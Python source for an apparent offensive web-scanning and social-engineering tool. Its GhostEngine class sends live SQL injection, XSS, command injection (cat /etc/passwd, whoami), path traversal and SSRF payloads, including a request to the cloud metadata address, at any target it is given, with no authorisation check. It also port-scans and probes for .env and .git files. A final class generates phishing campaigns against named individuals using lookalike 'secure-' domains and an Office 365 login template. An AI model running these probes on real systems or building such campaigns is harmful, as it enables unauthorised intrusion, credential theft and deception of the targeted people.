# --- SOCIAL ENGINEERING MODULE ---
import datetime
import json
import re
import secrets
import socket
import ssl
import urllib.request
import urllib.parse
import urllib.error
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

from cyberapp.models.db import db_conn


class GhostEngine:
    def __init__(self, target, scan_id):
        self.target = target.strip()
        self.scan_id = scan_id
        self.base_url = self._normalize_target(self.target)
        self.domain = urlparse(self.base_url).netloc
        self.timeout = 15
        self.vulnerabilities_found = []
        self.session = None
        
    def _normalize_target(self, target):
        if not target.startswith(("http://", "https://")):
            return f"http://{target}"
        return target

    def get_headers(self):
        try:
            req = urllib.request.Request(self.base_url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return dict(resp.headers)
        except Exception as e:
            self.log("tool_logs", "GHOST_HEADER_ERROR", str(e)[:100])
            return {}

    def get_page_content(self, url=None):
        try:
            target_url = url or self.base_url
            req = urllib.request.Request(target_url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return resp.read().decode('utf-8', errors='ignore')
        except Exception as e:
            self.log("tool_logs", "GHOST_CONTENT_ERROR", str(e)[:100])
            return ""

    def log(self, table, col, val, extra=None):
        try:
            with db_conn() as conn:
                if table == "intel":
                    conn.execute(
                        "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
                        (self.scan_id, col, val),
                    )
                elif table == "tool_logs":
                    conn.execute(
                        "INSERT INTO tool_logs (scan_id, tool_name, output) VALUES (?, ?, ?)",
                        (self.scan_id, col, val),
                    )
                elif table == "vulns":
                    conn.execute(
                        "INSERT INTO vulns (scan_id, type, url, fix, severity) VALUES (?, ?, ?, ?, ?)",
                        (self.scan_id, col, extra or self.base_url, val, self._determine_severity(col)),
                    )
                conn.commit()
        except Exception:
            pass

    def _determine_severity(self, vuln_type):
        """Determine severity based on vulnerability type"""
        severe_types = ['SQL_INJECTION', 'RCE', 'GIZLI ANAHTAR', 'BACKDOOR', 'PRIVILEGE ESCALATION', 'AUTH BYPASS', 'COMMAND_INJECTION']
        high_types = ['XSS', 'LFI', 'FILE UPLOAD', 'IDOR', 'SSRF', 'OPEN_REDIRECT', 'PATH_TRAVERSAL']
        medium_types = ['INFORMATION DISCLOSURE', 'SENSITIVE DATA', 'MISSING HEADERS', 'DEBUG_ENABLED', 'SENSITIVE_FILE']
        
        vuln_upper = vuln_type.upper()
        for t in severe_types:
            if t in vuln_upper:
                return 'CRITICAL'
        for t in high_types:
            if t in vuln_upper:
                return 'HIGH'
        for t in medium_types:
            if t in vuln_upper:
                return 'MEDIUM'
        return 'MEDIUM'

    def verify_file(self, url):
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return resp.status < 400
        except Exception:
            return False

    def crawl_links(self, content):
        if not content:
            return []
        return list(set(re.findall(r'href=["\']([^"\']+)["\']', content)))

    def check_path(self, path):
        try:
            url = urljoin(self.base_url, path)
            return self.verify_file(url)
        except Exception:
            return False

    def ai_suggestions(self, headers):
        suggestions = []
        if headers:
            if "X-Frame-Options" not in headers:
                suggestions.append("Missing X-Frame-Options header")
            if "Content-Security-Policy" not in headers:
                suggestions.append("Missing Content-Security-Policy header")
            if "Strict-Transport-Security" not in headers:
                suggestions.append("Missing HSTS header")
            if "X-Content-Type-Options" not in headers:
                suggestions.append("Missing X-Content-Type-Options header")
            if "Server" in headers:
                suggestions.append(f"Server banner exposed: {headers['Server']}")
            if "X-Powered-By" in headers:
                suggestions.append(f"X-Powered-By exposed: {headers['X-Powered-By']}")
        return suggestions

    # ==================== ACTIVE VULNERABILITY SCANNERS ====================

    def _test_sql_injection(self):
        """Active SQL Injection testing with payloads"""
        sql_payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' /*",
            "' UNION SELECT 1,2,3 --",
            "' UNION SELECT 1,2,3,4 --",
            "' OR 1=1 --",
            "1 OR 1=1",
            "' OR ''='",
        ]
        
        sql_errors = [
            "You have an error in your SQL syntax",
            "mysql_fetch_array()",
            "Warning: mysql_",
            "ORA-01756",
            "SQLSTATE[23000]",
            "Microsoft OLE DB Provider for SQL Server",
            "Unclosed quotation mark",
            "PostgreSQL query failed",
            "SQL syntax error",
            "supplied argument is not a valid MySQL",
            "Incorrect syntax near",
            "syntax error at or near",
            "Division by zero error",
        ]
        
        # Get all links from the page
        content = self.get_page_content()
        links = self.crawl_links(content)
        
        # Test the main URL
        test_urls = [self.base_url]
        for link in links[:10]:  # Test up to 10 links
            if link.startswith('http'):
                test_urls.append(link)
            elif link.startswith('/'):
                test_urls.append(urljoin(self.base_url, link))
        
        for url in test_urls:
            if '?' in url or '=' in url:
                parsed = urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                
                for param_name in params.keys():
                    test_url = url.replace(f"{param_name}={params[param_name][0]}", f"{param_name}='")
                    try:
                        content = self.get_page_content(test_url)
                        for error in sql_errors:
                            if error.lower() in content.lower():
                                self.log("vulns", "SQL_INJECTION", f"SQL Injection detected via parameter '{param_name}'", url)
                                return True
                    except Exception:
                        pass
                    
                    # Test boolean-based blind SQLi
                    test_url_true = url.replace(f"{param_name}={params[param_name][0]}", f"{param_name}=1 OR '1'='1")
                    test_url_false = url.replace(f"{param_name}={params[param_name][0]}", f"{param_name}=1 AND '1'='2")
                    
                    try:
                        content_true = self.get_page_content(test_url_true)
                        content_false = self.get_page_content(test_url_false)
                        
                        # If pages have different lengths/content, might be vulnerable
                        if len(content_true) != len(content_false) and 'error' not in content_true.lower():
                            self.log("vulns", "SQL_INJECTION_BLIND", f"Potential blind SQL Injection via '{param_name}'", url)
                    except Exception:
                        pass
            else:
                # Test POST-like parameters in URL
                for payload in sql_payloads[:3]:
                    try:
                        full_url = f"{url}?id={urllib.parse.quote(payload)}"
                        content = self.get_page_content(full_url)
                        for error in sql_errors:
                            if error.lower() in content.lower():
                                self.log("vulns", "SQL_INJECTION", f"SQL Injection detected: {payload}", url)
                                return True
                    except Exception:
                        pass
        
        return False

    def _test_xss(self):
        """Active XSS testing with payloads"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
        ]
        
        # Get all links from the page
        content = self.get_page_content()
        links = self.crawl_links(content)
        
        test_urls = [self.base_url]
        for link in links[:10]:
            if link.startswith('http'):
                test_urls.append(link)
            elif link.startswith('/'):
                test_urls.append(urljoin(self.base_url, link))
        
        for url in test_urls:
            if '?' in url or '=' in url:
                parsed = urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                
                for param_name in params.keys():
                    for payload in xss_payloads:
                        test_url = url.replace(f"{param_name}={params[param_name][0]}", f"{param_name}={urllib.parse.quote(payload)}")
                        try:
                            result_content = self.get_page_content(test_url)
                            
                            # Check if payload is reflected in the response
                            if payload[:50] in result_content or payload.replace('<', '&lt;') in result_content:
                                self.log("vulns", "XSS", f"Reflected XSS via parameter '{param_name}'", test_url)
                                return True
                        except Exception:
                            pass
            else:
                # Test with ID parameter
                for payload in xss_payloads[:3]:
                    try:
                        full_url = f"{url}?q={urllib.parse.quote(payload)}"
                        result_content = self.get_page_content(full_url)
                        if payload[:30] in result_content or payload.replace('<', '&lt;') in result_content:
                            self.log("vulns", "XSS", f"Reflected XSS detected: {payload[:30]}", full_url)
                    except Exception:
                        pass
        
        return False

    def _test_command_injection(self):
        """Test for command injection vulnerabilities"""
        cmd_payloads = [
            "; whoami",
            "| whoami",
            "`whoami`",
            "&& whoami",
            "|| whoami",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "; ls",
            "| ls",
            "; pwd",
            "| pwd",
        ]
        
        cmd_outputs = ["root:", "bin:", "daemon:", "www-data:", "/bin/", "/usr/bin"]
        
        # Get all links from the page
        content = self.get_page_content()
        links = self.crawl_links(content)
        
        test_urls = [self.base_url]
        for link in links[:10]:
            if link.startswith('http'):
                test_urls.append(link)
            elif link.startswith('/'):
                test_urls.append(urljoin(self.base_url, link))
        
        for url in test_urls:
            if '?' in url or '=' in url:
                parsed = urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                
                for param_name in params.keys():
                    for payload in cmd_payloads:
                        test_url = url.replace(f"{param_name}={params[param_name][0]}", f"{param_name}={urllib.parse.quote(payload)}")
                        try:
                            result_content = self.get_page_content(test_url)
                            for output in cmd_outputs:
                                if output in result_content:
                                    self.log("vulns", "COMMAND_INJECTION", f"Command Injection via '{param_name}'", test_url)
                                    return True
                        except Exception:
                            pass
        
        return False

    def _test_path_traversal(self):
        """Test for path traversal vulnerabilities"""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//etc/passwd",
            "/etc/passwd",
            "../../../proc/self/environ",
            "..%2F..%2Fetc%2Fpasswd",
            "%2e%2e/etc/passwd",
        ]
        
        path_signatures = [
            "root:x:",
            "[fonts]",
            "[extensions]",
            "daemon:x:",
            "bin:x:",
            "SYSTEM",
        ]
        
        # Get all links from the page
        content = self.get_page_content()
        links = self.crawl_links(content)
        
        test_urls = [self.base_url]
        for link in links[:10]:
            if link.startswith('http'):
                test_urls.append(link)
            elif link.startswith('/'):
                test_urls.append(urljoin(self.base_url, link))
        
        for url in test_urls:
            if '?' in url or '=' in url:
                parsed = urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                
                for param_name in params.keys():
                    for payload in path_payloads:
                        test_url = url.replace(f"{param_name}={params[param_name][0]}", f"{param_name}={urllib.parse.quote(payload)}")
                        try:
                            result_content = self.get_page_content(test_url)
                            for sig in path_signatures:
                                if sig in result_content:
                                    self.log("vulns", "PATH_TRAVERSAL", f"Path Traversal via '{param_name}'", test_url)
                                    return True
                        except Exception:
                            pass
        
        return False

    def _test_open_redirect(self):
        """Test for open redirect vulnerabilities"""
        redirect_payloads = [
            "https://evil.com",
            "https://google.com",
            "//evil.com",
            "/\\/evil.com",
            "https:evil.com",
            "javascript:alert(1)",
        ]
        
        content = self.get_page_content()
        links = self.crawl_links(content)
        
        for link in links:
            if any(p in link for p in ["url=", "redirect=", "next=", "return=", "goto=", "dest=", "destination="]):
                for payload in redirect_payloads:
                    if payload in link:
                        full_url = urljoin(self.base_url, link)
                        self.log("vulns", "OPEN_REDIRECT", f"Potential open redirect: {payload}", full_url)
                        return True
        
        return False

    def _test_ssrf(self):
        """Test for SSRF vulnerabilities"""
        ssrf_payloads = [
            "http://127.0.0.1:80",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://localhost:80",
            "http://[::1]:80",
            "http://169.254.169.254/latest/meta-data/",
        ]
        
        ssrf_signatures = [
            "<!DOCTYPE html>",
            "<html",
            "AMI",
            "ami-id",
            "instance-id",
            "metadata",
        ]
        
        content = self.get_page_content()
        links = self.crawl_links(content)
        
        test_urls = [self.base_url]
        for link in links[:10]:
            if link.startswith('http'):
                test_urls.append(link)
            elif link.startswith('/'):
                test_urls.append(urljoin(self.base_url, link))
        
        for url in test_urls:
            if '?' in url or '=' in url:
                parsed = urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                
                for param_name in params.keys():
                    for payload in ssrf_payloads:
                        test_url = url.replace(f"{param_name}={params[param_name][0]}", f"{param_name}={urllib.parse.quote(payload)}")
                        try:
                            result_content = self.get_page_content(test_url)
                            for sig in ssrf_signatures:
                                if sig in result_content and len(result_content) < 5000:
                                    self.log("vulns", "SSRF", f"Potential SSRF via '{param_name}'", test_url)
                                    return True
                        except Exception:
                            pass
        
        return False

    def _check_information_disclosure(self, content):
        """Check for information disclosure in content"""
        info_patterns = [
            "Warning:",
            "Notice:",
            "PHP Notice",
            "PHP Warning",
            "Stack trace:",
            "at line",
            ".php on line",
            "Traceback (most recent call last):",
            "Directory listing",
            "Index of /",
            "sqlmap",
            "nmap",
            "Nikto",
            "Apache/2.4",
            "PHP/7",
            "ASP.NET",
            "Node.js",
            "debug",
            "verbose",
            "ERROR",
            "Exception",
        ]
        
        for pattern in info_patterns:
            if pattern in content:
                self.log("vulns", "INFORMATION DISCLOSURE", f"Information disclosure: {pattern}", self.base_url)
                return True
        return False

    def _check_common_files(self):
        """Check for common sensitive files"""
        common_files = [
            "/.git/config",
            "/.env",
            "/.env.production",
            "/.env.local",
            "/backup.sql",
            "/wp-config.php.bak",
            "/.DS_Store",
            "/phpinfo.php",
            "/info.php",
            "/test.php",
            "/admin.php",
            "/admin/",
            "/robots.txt",
            "/sitemap.xml",
            "/.htaccess",
            "/web.config",
            "/debug.log",
            "/error.log",
            "/application.log",
            "/config.php",
            "/db.php",
            "/database.yml",
            "/.gitignore",
            "/README.md",
            "/CHANGELOG.md",
            "/wp-admin/",
            "/wp-login.php",
            "/administrator/",
            "/phpmyadmin/",
            "/.well-known/",
            "/server-status",
            "/.svn/",
            "/CVS/",
        ]
        
        found_count = 0
        for file_path in common_files:
            url = urljoin(self.base_url, file_path)
            if self.verify_file(url):
                self.log("vulns", "SENSITIVE FILE", f"Sensitive file accessible: {file_path}", url)
                found_count += 1
        
        return found_count

    def _check_directory_listing(self, content):
        """Check for directory listing"""
        if "Index of /" in content or "Directory listing" in content or "<title>Index of" in content:
            self.log("vulns", "DIRECTORY LISTING", "Directory listing enabled", self.base_url)
            return True
        return False

    def _check_debug_mode(self, headers, content):
        """Check for debug mode enabled"""
        debug_detected = False
        
        if "X-Debug" in headers or "X-Drupal-Cache" in headers:
            self.log("vulns", "DEBUG_ENABLED", "Debug headers detected", self.base_url)
            debug_detected = True
        
        debug_strings = [
            "debug mode",
            "debugging enabled",
            "error_reporting(e_all)",
            "display_errors = on",
            "stack level too deep",
        ]
        
        for s in debug_strings:
            if s.lower() in content.lower():
                self.log("vulns", "DEBUG_ENABLED", f"Debug mode detected in content: {s}", self.base_url)
                debug_detected = True
        
        return debug_detected

    def _check_tech_stack(self, headers, content):
        """Detect technology stack"""
        tech_info = []
        
        server = headers.get('Server', '')
        powered_by = headers.get('X-Powered-By', '')
        
        if server:
            tech_info.append(f"Server: {server}")
        if powered_by:
            tech_info.append(f"Powered-By: {powered_by}")
        
        # Server header analysis
        if 'apache' in server.lower():
            tech_info.append("Apache")
        elif 'nginx' in server.lower():
            tech_info.append("Nginx")
        elif 'iis' in server.lower():
            tech_info.append("IIS")
        elif 'caddy' in server.lower():
            tech_info.append("Caddy")
        
        # Powered-By analysis
        if 'php' in powered_by.lower():
            tech_info.append("PHP")
        elif 'asp.net' in powered_by.lower():
            tech_info.append("ASP.NET")
        elif 'jsp' in powered_by.lower():
            tech_info.append("JSP")
        elif 'ruby' in powered_by.lower():
            tech_info.append("Ruby")
        
        # Content-based detection
        content_lower = content.lower()
        
        # CMS Detection
        if 'wp-content' in content_lower or 'wp-includes' in content_lower:
            tech_info.append("WordPress")
        elif 'Drupal.settings' in content_lower or 'drupal' in content_lower:
            tech_info.append("Drupal")
        elif 'joomla' in content_lower or 'com_content' in content_lower:
            tech_info.append("Joomla")
        
        # Framework Detection
        if 'wordpress' in content_lower:
            tech_info.append("WordPress")
        if 'django' in content_lower or 'csrfmiddlewaretoken' in content_lower:
            tech_info.append("Django")
        if 'flask' in content_lower:
            tech_info.append("Flask")
        if 'laravel' in content_lower or 'laravel_session' in content_lower:
            tech_info.append("Laravel")
        if 'rails' in content_lower or 'action_controller' in content_lower:
            tech_info.append("Ruby on Rails")
        if 'spring' in content_lower:
            tech_info.append("Spring")
        
        # JavaScript Framework Detection
        if 'react' in content_lower or '_react' in content_lower:
            tech_info.append("React")
        if 'angular' in content_lower or 'ng-' in content_lower:
            tech_info.append("Angular")
        if 'vue' in content_lower or 'vuejs' in content_lower:
            tech_info.append("Vue.js")
        if 'jquery' in content_lower:
            tech_info.append("jQuery")
        if 'bootstrap' in content_lower:
            tech_info.append("Bootstrap")
        
        # Database Detection
        if 'mysql' in content_lower:
            tech_info.append("MySQL")
        if 'postgresql' in content_lower or 'postgres' in content_lower:
            tech_info.append("PostgreSQL")
        if 'mongodb' in content_lower:
            tech_info.append("MongoDB")
        if 'redis' in content_lower:
            tech_info.append("Redis")
        
        # Log detected technologies
        if tech_info:
            self.log("intel", "TECH_STACK", f"Detected: {', '.join(set(tech_info))}")
            with db_conn() as conn:
                for tech in set(tech_info):
                    conn.execute(
                        "INSERT INTO techno (scan_id, name, version, via) VALUES (?, ?, ?, ?)",
                        (self.scan_id, tech, "", "Ghost Scanner"),
                    )
                conn.commit()
            return True
        
        return False

    def _check_security_headers(self, headers):
        """Check for missing security headers"""
        security_headers = {
            'X-Frame-Options': 'Clickjacking protection',
            'Content-Security-Policy': 'XSS protection',
            'Strict-Transport-Security': 'HTTPS enforcement',
            'X-Content-Type-Options': 'MIME type sniffing',
            'X-XSS-Protection': 'XSS filter',
            'Referrer-Policy': 'Referrer leakage',
            'Permissions-Policy': 'Feature permissions',
        }
        
        missing_count = 0
        for header, description in security_headers.items():
            if header not in headers:
                self.log("vulns", "MISSING_HEADERS", f"Missing {header}: {description}", self.base_url)
                missing_count += 1
        
        return missing_count

    def _scan_ports(self):
        """Quick port scan for common ports"""
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443]
        open_ports = []
        
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((self.domain, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        
        if open_ports:
            self.log("intel", "OPEN_PORTS", f"Open ports detected: {open_ports}")
            with db_conn() as conn:
                conn.execute(
                    "INSERT INTO intel (scan_id, type, data) VALUES (?, ?, ?)",
                    (self.scan_id, "PORT_SCAN", f"Open: {open_ports}"),
                )
                conn.commit()

    def _check_ssl(self):
        """Check SSL/TLS configuration"""
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((self.domain, 443), timeout=self.timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.domain) as ssock:
                    cert = ssock.getpeercert()
                    self.log("intel", "SSL_INFO", f"SSL Certificate: {cert.get('subject', 'Unknown')}")
        except Exception as e:
            self.log("tool_logs", "SSL_CHECK", str(e)[:100])

    def _check_subdomain_takeover(self):
        """Basic subdomain enumeration"""
        subdomains = ["www", "mail", "admin", "api", "dev", "test", "staging", "blog", "shop", "cdn"]
        found = []
        for sub in subdomains:
            try:
                ip = socket.gethostbyname(f"{sub}.{self.domain}")
                found.append(f"{sub}.{self.domain}")
            except socket.gaierror:
                pass
        if found:
            self.log("intel", "SUBDOMAINS", f"Found subdomains: {found}")

    # ==================== MAIN SCAN FUNCTION ====================

    def start(self):
        """Comprehensive vulnerability scan"""
        self.log("tool_logs", "GHOST_ENGINE", f"Starting comprehensive scan: {self.base_url}")
        
        headers = self.get_headers()
        content = self.get_page_content()
        
        if headers:
            self.log("intel", "GHOST_HEADERS", json.dumps(headers))
        
        # Run passive checks
        self._check_security_headers(headers)
        self._check_ssl()
        self._scan_ports()
        
        if content:
            self._check_tech_stack(headers, content)
            self._check_information_disclosure(content)
            self._check_directory_listing(content)
            self._check_debug_mode(headers, content)
            self._check_common_files()
            self._check_subdomain_takeover()
            
            # Run ACTIVE vulnerability tests
            self.log("tool_logs", "GHOST_ENGINE", "Starting active vulnerability tests...")
            
            self._test_sql_injection()
            self._test_xss()
            self._test_command_injection()
            self._test_path_traversal()
            self._test_open_redirect()
            self._test_ssrf()
        
        for suggestion in self.ai_suggestions(headers):
            self.log("vulns", "Header Eksik", self.base_url)
            self.log("intel", "GHOST_SUGGESTION", suggestion)

        self.log("tool_logs", "GHOST_ENGINE", f"Ghost scan completed for {self.base_url}")


class SocialEngineeringAI:
    def __init__(self, target_info):
        self.target_info = target_info or {}

    def _derive_domain(self):
        email = (self.target_info.get("email") or "").strip()
        company_domain = (self.target_info.get("company_domain") or "").strip()
        if company_domain:
            return company_domain
        if "@" in email:
            return email.split("@", 1)[1]
        return "example.com"

    def start_campaign(self, target_info=None):
        info = target_info or self.target_info
        domain = self._derive_domain()
        campaign_id = f"camp_{secrets.token_hex(4)}"
        fake_domain = f"secure-{domain}"
        phishing_url = f"https://{fake_domain}/login"

        return {
            "campaign_id": campaign_id,
            "fake_domain": fake_domain,
            "phishing_url": phishing_url,
            "template": "Office 365 Login",
            "created_at": datetime.datetime.utcnow().isoformat(),
            "target": {
                "name": info.get("name"),
                "email": info.get("email"),
                "company": info.get("company"),
                "position": info.get("position"),
            },
        }
